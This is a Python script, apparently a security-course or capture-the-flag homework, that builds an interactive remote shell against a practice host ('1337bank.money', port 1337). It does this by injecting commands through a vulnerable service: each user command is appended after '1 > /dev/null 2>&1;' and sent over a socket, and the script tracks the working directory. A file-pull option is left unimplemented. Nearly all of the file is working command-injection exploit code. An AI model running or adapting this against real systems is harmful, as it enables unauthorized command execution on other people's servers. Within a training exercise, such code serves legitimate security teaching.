"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
#!/usr/bin/env python3

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here


def execute_cmd(cmd):
    if "shell" in cmd:
        curr_path = '/'
        new_path = ''
        print("{}>".format(curr_path), end=" ")
        curr_cmd = ""
        curr_cmd = input()

        while True:
            curr_cmd = curr_cmd.lower().rstrip()
            if curr_cmd == "quit" or curr_cmd == "exit" :
                curr_path = '/'
                break
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            s.recv(1024)

            if curr_cmd.split(" ")[0] == "cd":
                curr_path = update_path(curr_path, curr_cmd)
            else:
                # send command, first part is to redirect to /dev/null so I don't see the output
                # also first cd into appropriate directory
                s.send("1 > /dev/null 2>&1; cd {} && {}\n".format(curr_path, curr_cmd).encode())
                data = s.recv(1024)
                for i in data.decode().split("\n"):
                    print(i)



            print("{}>".format(curr_path), end=" ")
            curr_cmd = input()
            curr_cmd = curr_cmd.lower().rstrip()
    
    elif "pull" in cmd:
        pass

def update_path(c_path, c_cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    s.recv(1024)
    # similar command as above, but I return the new path after cd
    s.send("1 > /dev/null 2>&1; cd {} && {} && pwd\n".format(c_path, c_cmd).encode())
    print()
    data = s.recv(1024)
    return data.decode().rstrip()

if __name__ == '__main__':
    print(">", end=" ")
    command = input()
    
    command = command.lower().rstrip()
    while "quit" not in command:
        if command == "shell" or command.split(" ")[0] == "pull":
            execute_cmd(command)
        else:
            print("1. shell - Drop into an interactive shell and allow users to gracefully exit\n2. pull - <remote-path> <local-path> Download files\n3. help - Shows this help menu\n4. quit - Quit the shell\n")

        print(">", end= " ")
        command = input()
        command = command.lower()
